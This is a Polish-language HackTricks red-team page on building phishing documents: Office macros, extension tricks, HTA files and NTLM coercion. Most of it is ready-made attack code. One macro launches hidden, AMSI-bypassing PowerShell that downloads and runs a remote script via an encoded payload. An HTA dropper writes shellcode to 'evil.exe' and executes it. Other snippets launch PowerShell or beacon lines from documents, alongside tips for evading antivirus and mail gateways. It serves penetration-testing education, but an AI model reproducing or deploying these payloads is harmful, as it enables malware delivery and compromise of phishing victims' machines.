# Phishing Files & Documents

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Dokumenty biurowe

Microsoft Word wykonuje walidację danych pliku przed jego otwarciem. Walidacja danych odbywa się w formie identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli wystąpi błąd podczas identyfikacji struktury danych, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku poprzez zmianę rozszerzenia pliku i nadal zachowanie możliwości wykonywania makr.\
Na przykład plik RTF nie obsługuje makr, z założenia, ale plik DOCM zmieniony na RTF będzie obsługiwany przez Microsoft Word i będzie zdolny do wykonywania makr.\
Te same wewnętrzne mechanizmy mają zastosowanie do całego oprogramowania z pakietu Microsoft Office (Excel, PowerPoint itp.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX pliki odwołujące się do zdalnego szablonu (Plik – Opcje – Dodatki – Zarządzaj: Szablony – Przejdź) które zawierają makra mogą również „wykonywać” makra.

### Ładowanie zewnętrznych obrazów

Przejdź do: _Wstaw --> Szybkie części --> Pole_\
&#xNAN;_**Kategorie**: Linki i odniesienia, **Nazwy pól**: includePicture, oraz **Nazwa pliku lub URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (155).png>)

### Backdoor makr

Możliwe jest użycie makr do uruchamiania dowolnego kodu z dokumentu.

#### Funkcje autoload

Im bardziej powszechne, tym bardziej prawdopodobne, że AV je wykryje.

* AutoOpen()
* Document\_Open()

#### Przykłady kodu makr
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usuwanie metadanych

Przejdź do **Plik > Informacje > Sprawdź dokument > Sprawdź dokument**, co uruchomi Inspektora dokumentów. Kliknij **Sprawdź**, a następnie **Usuń wszystko** obok **Właściwości dokumentu i informacje osobiste**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz rozwijane menu **Zapisz jako typ**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
Zrób to, ponieważ **nie możesz zapisać makr w `.docx`** i istnieje **stygmat** **związany** z rozszerzeniem makro-umożliwiającym **`.docm`** (np. ikona miniatury ma ogromne `!`, a niektóre bramy internetowe/e-mailowe całkowicie je blokują). Dlatego to **stare rozszerzenie `.doc` jest najlepszym kompromisem**.

#### Generatory złośliwych makr

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Pliki HTA

HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i działa jako "w pełni zaufana" aplikacja, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiane za pomocą **`mshta.exe`**, które jest zazwyczaj **instalowane** razem z **Internet Explorer**, co sprawia, że **`mshta` jest zależne od IE**. Jeśli zostało odinstalowane, HTA nie będą mogły się uruchomić.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów na **wymuszenie uwierzytelniania NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do e-maili lub HTML, które użytkownik otworzy (nawet HTTP MitM?). Lub wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnienie** tylko przy **otwieraniu folderu.**

**Sprawdź te pomysły i więcej na następujących stronach:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### Przekazywanie NTLM

Nie zapomnij, że nie tylko możesz ukraść hash lub uwierzytelnienie, ale także **przeprowadzać ataki przekazywania NTLM**:

* [**Ataki przekazywania NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (przekazywanie NTLM do certyfikatów)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>
{% endhint %}
